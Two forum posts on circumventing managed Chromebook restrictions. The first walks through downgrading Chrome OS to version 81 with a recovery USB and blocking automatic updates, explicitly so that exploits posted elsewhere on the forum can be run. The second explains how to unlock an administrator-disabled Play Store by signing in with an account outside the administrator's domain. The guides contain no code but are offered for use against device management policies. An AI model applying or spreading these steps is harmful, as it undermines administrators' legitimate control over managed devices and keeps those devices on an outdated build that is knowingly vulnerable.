downgrade any chrome os device
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
want to downgrade your chrome os device so you can look for exploits / dependencies? in this post you will learn how to downgrade your chrome os device without developer mode.

Requirements:
-8GB USB stick / external hard drive
-A personal computer that can run extensions from the chrome web store
-a brain ( preferred)

Step 1:
Go onto google chrome on the chrome os device and type in "chrome://version".

Step 2:
Look at the line called platform and get the build id (next to the (Official Build)).

The most common id is "octopus".

Step 3:
Go onto chrome100.dev on your personal computer, press ctrl + f and type in the last word of your build id e.g "octopus".

Step 4:
Download the preferred version. I reccomend 81 as it has most the exploits on this forum.

Step 5: 
Download "Chromebook Recovery Utility" on your personal computer through the chrome web store.

Step 6:
Open CRU, press the gear icon on the top right and select use local image. Proceed to select the file you just downloaded.

Step 7:
Plug in the USB Flash Stick / External HDD.

Step 8:
Follow the prompts till it is complete.

Step 9:
On your chrome os device, sign out and press esc + refresh + power to bring up the recovery screen. Proceed to plug in your USB / External HDD.

Step 10:
Once it is complete, setup like usual but once you have accepted the user agreement and see "checking for updates", keep pressing ctrl + alt + e to avoid chrome automatically updating.

congratulations! you have now downgraded your device and can go ahead and complete any of the other posts on the forum. i posted this tutorial as there wasn't already one and it might of been confusing for beginners.

bypass playstore lock / disabled
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
Q: I'm sick and tired of the playstore being blocked, it has access to so many vital features. How do I unblock it?

A: This method only works if your chromebook is v81, however you can update it later and still keep the apps.

Variables: aga - Addition of google accounts disabled by administrator

if aga is false:

Downgrade to chrome os v81

Complete setup like usual

Wait till play store installs

Go to settings > apps > Google Play Store > Manage Android Preferences > Accounts > Add Account > Google

Sign into an alternate account or your main one, just make sure it isn't one that is under your chrome os administrator's domain

Go to google play store, press on the profile icon at the top left, select your account and done!

if aga is true:

Downgrade to chrome os v81

Complete setup like usual

Wait till play store installs

Quickly go to settings > apps > Google Play Store > Manage Android Preferences > Accounts > Add Account > Google

Sign into an alternate account or your main one, just make sure it isn't one that is under your chrome os administrator's domain

Go to google play store, press on the profile icon at the top left, select your account and done!

If google play store keeps closing while trying to install, press "download" on your app, then quickly switch to your default account.
